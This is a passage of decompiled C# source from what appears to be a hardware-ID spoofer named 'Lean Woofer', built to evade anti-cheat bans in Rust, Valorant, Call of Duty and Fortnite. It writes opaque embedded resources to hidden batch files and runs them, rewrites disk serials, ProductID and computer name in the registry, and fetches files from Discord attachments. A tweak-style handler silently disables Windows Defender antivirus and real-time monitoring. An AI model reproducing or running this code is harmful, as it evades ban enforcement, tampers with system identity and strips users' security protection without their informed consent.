					File.SetAttributes(tempPath2 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath2 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					d d2 = new d();
					d2.b();
					HWIDclick();
					string value2 = "A3A5B" + "-" + "46F29" + "-" + "6E3C3" + "-" + "D3DE0";
					RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
					registryKey2.SetValue("ProductID", value2);
					registryKey2.Close();
					InstallDate();
					Disk();
					HWIDclick();
					XBOXclick();
					PCclick();
					Diskclick();
					bi();
					SpoofPCName();
					string path4 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path4))
					{
						Directory.CreateDirectory(path4);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text5 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter5 = File.CreateText(text5))
						{
							streamWriter5.WriteLine("netsh int ip reset");
						}
						Process process8 = new Process();
						process8.StartInfo.FileName = text5;
						this.m_d.Add(process8);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process8.Start();
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
					}
					string text6 = this.m_bm.Text;
					string path5 = "C:\\Program Files\\Unlisted";
					if (!Directory.Exists(path5))
					{
						Directory.CreateDirectory(path5);
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						string text7 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter6 = File.CreateText(text7))
						{
							streamWriter6.WriteLine("Volumeid.exe " + text6 + ": " + "2267" + "-" + "4429" + " -nobanner");
						}
						Process process9 = new Process();
						process9.StartInfo.FileName = text7;
						this.m_d.Add(process9);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process9.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path5);
					}
					else
					{
						byte[] bytes3 = File.ReadAllBytes("558460");
						File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes3);
						File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
						Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
						Thread.Sleep(500);
						string text8 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter7 = File.CreateText(text8))
						{
							streamWriter7.WriteLine("Volumeid.exe " + text6 + ": " + "5787" + "-" + "7545" + " -nobanner");
						}
						Process process10 = new Process();
						process10.StartInfo.FileName = text8;
						this.m_d.Add(process10);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process10.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path5);
					}
					MessageBox.Show("Spoofed Rust!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.m_aq.Text == "Valorant")
				{
					string tempPath3 = Path.GetTempPath();
					byte[] bytes4 = File.ReadAllBytes("479255");
					File.WriteAllBytes(tempPath3 + this.m_c + ".bat", bytes4);
					File.SetAttributes(tempPath3 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath3 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					string[] subKeyNames = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames();
					foreach (string text9 in subKeyNames)
					{
						string[] subKeyNames2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text9).GetSubKeyNames();
						foreach (string text10 in subKeyNames2)
						{
							RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text9 + "\\" + text10 + "\\Target Id 0\\Logical Unit Id 0", writable: true);
							if (registryKey3 != null && registryKey3.GetValue("DeviceType").ToString() == "DiskPeripheral")
							{
								string value3 = "XB0L95MV9YE3IR";
								string value4 = "XB0L95MV9YE3IR";
								registryKey3.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value4));
								registryKey3.SetValue("Identifier", value3);
								registryKey3.SetValue("InquiryData", Encoding.UTF8.GetBytes(value3));
								registryKey3.SetValue("SerialNumber", value4);
							}
						}
						RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", writable: true);
						registryKey4.SetValue("ComputerName", "DESKTOP-" + "949C2E");
						registryKey4.Close();
						_ = "E21E1" + "-" + "9F8FE" + "-" + "32727" + "-" + "61266";
						string path6 = "C:\\Program Files\\Sounds";
						if (!Directory.Exists(path6))
						{
							Directory.CreateDirectory(path6);
						}
						HWIDclick();
						string path7 = "C:\\Program Files\\Sounds";
						if (!Directory.Exists(path7))
						{
							Directory.CreateDirectory(path7);
						}
						if (File.Exists("C:\\Program Files\\Sounds\\valospoofed.wav"))
						{
							new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
						}
						else
						{
							string address2 = "https://cdn.discordapp.com/attachments/953684464104513571/960200320993095731/valospoofed.wav";
							string fileName2 = "C:\\Program Files\\Sounds\\valospoofed.wav";
							WebClient webClient2 = new WebClient();
							webClient2.DownloadFile(address2, fileName2);
							File.SetAttributes("C:\\Program Files\\Sounds\\valospoofed.wav", FileAttributes.Hidden);
							new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
						}
						MessageBox.Show("Valorant Spoofed, New ID: " + CurrentProductID(), "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				else if (this.m_aq.Text == "Call Of Duty")
				{
					string tempPath4 = Path.GetTempPath();
					byte[] bytes5 = File.ReadAllBytes("319355");
					File.WriteAllBytes(tempPath4 + this.m_c + ".bat", bytes5);
					File.SetAttributes(tempPath4 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath4 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					d d3 = new d();
					d3.b();
					HWIDclick();
					string value5 = "A6134" + "-" + "BB76F" + "-" + "48D60" + "-" + "D7D26";
					RegistryKey registryKey5 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
					registryKey5.SetValue("ProductID", value5);
					registryKey5.Close();
					InstallDate();
					Disk();
					HWIDclick();
					XBOXclick();
					PCclick();
					Diskclick();
					bi();
					SpoofPCName();
					string tempPath5 = Path.GetTempPath();
					byte[] bytes6 = File.ReadAllBytes("075553");
					File.WriteAllBytes(tempPath5 + this.m_c + ".bat", bytes6);
					File.SetAttributes(tempPath5 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath5 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					string path8 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path8))
					{
						Directory.CreateDirectory(path8);
					}
					string tempPath6 = Path.GetTempPath();
					byte[] bytes7 = File.ReadAllBytes("743506");
					File.WriteAllBytes(tempPath6 + this.m_c + ".bat", bytes7);
					File.SetAttributes(tempPath6 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath6 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text11 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter8 = File.CreateText(text11))
						{
							streamWriter8.WriteLine("netsh int ip reset");
						}
						Process process11 = new Process();
						process11.StartInfo.FileName = text11;
						this.m_d.Add(process11);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process11.Start();
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
					}
					string text12 = this.m_bm.Text;
					string path9 = "C:\\Program Files\\Unlisted";
					if (!Directory.Exists(path9))
					{
						Directory.CreateDirectory(path9);
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						string text13 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter9 = File.CreateText(text13))
						{
							streamWriter9.WriteLine("Volumeid.exe " + text12 + ": " + "7273" + "-" + "3671" + " -nobanner");
						}
						Process process12 = new Process();
						process12.StartInfo.FileName = text13;
						this.m_d.Add(process12);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process12.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path9);
					}
					else
					{
						byte[] bytes8 = File.ReadAllBytes("558460");
						File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes8);
						File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
						Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
						Thread.Sleep(500);
						string text14 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter10 = File.CreateText(text14))
						{
							streamWriter10.WriteLine("Volumeid.exe " + text12 + ": " + "2771" + "-" + "7593" + " -nobanner");
						}
						Process process13 = new Process();
						process13.StartInfo.FileName = text14;
						this.m_d.Add(process13);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process13.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path9);
					}
					MessageBox.Show("Spoofed Call Of Duty!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.m_aq.Text == "Fortnite")
				{
					string tempPath7 = Path.GetTempPath();
					byte[] bytes9 = File.ReadAllBytes("299894");
					File.WriteAllBytes(tempPath7 + this.m_c + ".bat", bytes9);
					File.SetAttributes(tempPath7 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath7 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					string tempPath8 = Path.GetTempPath();
					byte[] bytes10 = File.ReadAllBytes("203677");
					File.WriteAllBytes(tempPath8 + this.m_c + ".bat", bytes10);
					File.SetAttributes(tempPath8 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath8 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					string tempPath9 = Path.GetTempPath();
					byte[] bytes11 = File.ReadAllBytes("639184");
					File.WriteAllBytes(tempPath9 + this.m_c + ".bat", bytes11);
					File.SetAttributes(tempPath9 + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath9 + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					string path10 = "C:\\Program Files\\Sounds";
					if (!Directory.Exists(path10))
					{
						Directory.CreateDirectory(path10);
					}
					if (File.Exists("C:\\Program Files\\Sounds\\fortinaity.wav"))
					{
						new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
						MessageBox.Show("Fortnite Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						return;
					}
					string address3 = "https://cdn.discordapp.com/attachments/953684464104513571/959438041670381628/fortinaity.wav";
					string fileName3 = "C:\\Program Files\\Sounds\\fortinaity.wav";
					WebClient webClient3 = new WebClient();
					webClient3.DownloadFile(address3, fileName3);
					File.SetAttributes("C:\\Program Files\\Sounds\\fortinaity.wav", FileAttributes.Hidden);
					new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
					MessageBox.Show("Fortnite Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					MessageBox.Show("Please Select A Game!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch
			{
			}
		}

		private void ac(object sender, EventArgs e)
		{
			this.m_ak.BringToFront();
		}

		private void ad(object sender, EventArgs e)
		{
			this.m_ar.BringToFront();
		}

		private void ae(object sender, PaintEventArgs e)
		{
		}

		private void af(object sender, EventArgs e)
		{
			if (this.m_aq.Text == "FiveM Bypass")
			{
				this.m_bw.Show();
				this.m_bx.Show();
			}
			else
			{
				this.m_bw.Hide();
				this.m_bx.Hide();
			}
		}

		private void ag(object sender, EventArgs e)
		{
			HWIDclick();
			MessageBox.Show("Spoofed HWID!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		public void xynwbyzia()
		{
			string tempPath = Path.GetTempPath();
			if (Process.GetProcessesByName(this.m_c + ".bat").Length == 0)
			{
				File.Delete(tempPath + this.m_c + ".bat");
				return;
			}
			Thread.Sleep(5000);
			xynwbyzia();
		}

		public static string GenerateDate(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "abcdef0123456789"[random.Next("abcdef0123456789".Length)];
			}
			return new string(array);
		}

		private void ah(object sender, EventArgs e)
		{
			string value = "7f395b7d";
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
			registryKey.SetValue("InstallDate", value);
			registryKey.Close();
			string tempPath = Path.GetTempPath();
			byte[] bytes = File.ReadAllBytes("299894");
			File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
			File.SetAttributes(tempPath + this.m_c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			MessageBox.Show("Logs Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		private void ai(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = File.ReadAllBytes("358697");
			File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
			Process.Start(tempPath + this.m_c + ".bat");
			Thread.Sleep(2500);
			xynwbyzia();
			MessageBox.Show("Mac Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		private void aj(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("Append Completion", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("AutoSuggest", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", writable: true).DeleteValue("EnableAutoTray", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", throwOnMissingSubKey: false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", throwOnMissingSubKey: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("AutoEndTasks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("HungAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("WaitToKillAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("LowLevelHooksTimeout", throwOnMissingValue: false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoLowDiskSpaceChecks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("LinkResolveIgnoreLinkInfo", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveSearch", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveTrack", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoInternetOpenWith", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
